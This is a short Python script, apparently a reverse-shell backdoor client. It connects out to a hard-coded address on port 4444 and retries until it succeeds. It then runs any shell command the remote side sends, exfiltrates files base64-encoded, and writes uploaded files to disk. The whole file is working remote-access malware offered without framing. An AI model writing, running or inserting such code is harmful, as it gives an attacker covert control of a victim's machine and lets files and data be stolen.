import socket
import json
import subprocess
import os
import base64
import time

def server(host, port):
    print("[+] Connecting to server...")
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            print("[+] Connected to server")
            return s
        except Exception as e:
            print(f"[-] Error connecting to server: {e}")
            time.sleep(5)

def send(s, data):
    json_data = json.dumps(data)
    s.send(json_data.encode())

def receive(s):
    json_data = ""
    while True:
        try:
            json_data = json_data + s.recv(1024).decode()
            return json.loads(json_data)
        except ValueError:
            continue

def run(s):
    while True:
        command = receive(s)
        if command['command'] == 'exit':
            print("[+] Exiting...")
            break
        elif command['command'] == 'cd':
            os.chdir(command['path'])
        elif command['command'] == 'download':
            with open(command['path'], 'rb') as f:
                data = base64.b64encode(f.read()).decode()
            send(s, {'command': 'download', 'data': data})
        elif command['command'] == 'upload':
            with open(command['path'], 'wb') as f:
                f.write(base64.b64decode(command['data']))
        else:
            output = subprocess.getoutput(command['command'])
            send(s, {'command': command['command'], 'output': output})

s = server('192.168.0.102', 4444)
run(s)